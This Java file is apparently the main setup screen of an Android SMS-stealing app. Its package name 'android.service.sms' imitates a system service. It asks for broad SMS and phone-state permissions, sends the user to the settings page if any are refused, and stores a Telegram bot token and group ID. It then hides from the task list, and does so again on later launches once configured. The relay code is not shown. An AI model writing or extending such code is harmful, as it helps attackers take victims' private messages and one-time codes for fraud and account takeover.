package android.service.sms.activities;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.service.sms.R;
import android.service.sms.helpers.SharedPrefHelper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 45354;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        requestPermissions(this);

        Button saveBtn = findViewById(R.id.saveBtn);
        EditText botTokenET = findViewById(R.id.tgBotTokenET);
        EditText groupIDET = findViewById(R.id.tgGroupIDET);

        SharedPrefHelper sharedPrefHelper = new SharedPrefHelper(MainActivity.this);

        if (!sharedPrefHelper.getTGBotToken().isEmpty() && !sharedPrefHelper.getTGGroupID().isEmpty()){
            finishAndRemoveTask();
        }

        saveBtn.setOnClickListener(v -> {
            String token = botTokenET.getText().toString().trim();
            String groupID = groupIDET.getText().toString().trim();

            if (!token.isEmpty() && !groupID.isEmpty()){

                sharedPrefHelper.saveTGBotToken(token);
                sharedPrefHelper.saveTGGroupID(groupID);

                Toast.makeText(this, "Saved successfully!", Toast.LENGTH_SHORT).show();

                new Handler(Looper.getMainLooper()).postDelayed(this::finishAndRemoveTask, 2000);
            } else {
                Toast.makeText(this, "Please fill all the fields", Toast.LENGTH_SHORT).show();
            }
        });
    }

//    ----------------------------------------------------------------------------------------------

    public static void requestPermissions(Activity activity) {

        List<String> permissionsNeeded = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                permissionsNeeded.add(Manifest.permission.READ_PHONE_NUMBERS);
            }
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS);
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.SEND_SMS);
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(activity, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

//    ----------------------------------------------------------------------------------------------


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {

            if (grantResults.length < 1 || grantResults[0] != PackageManager.PERMISSION_GRANTED) {

                Toast.makeText(this, "Allow all permissions", Toast.LENGTH_SHORT).show();

                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);

                new Handler().postDelayed(this::finish, 2000);
            } else {
                Toast.makeText(this, "All permissions granted successfully!", Toast.LENGTH_SHORT).show();
            }
        }
    }
}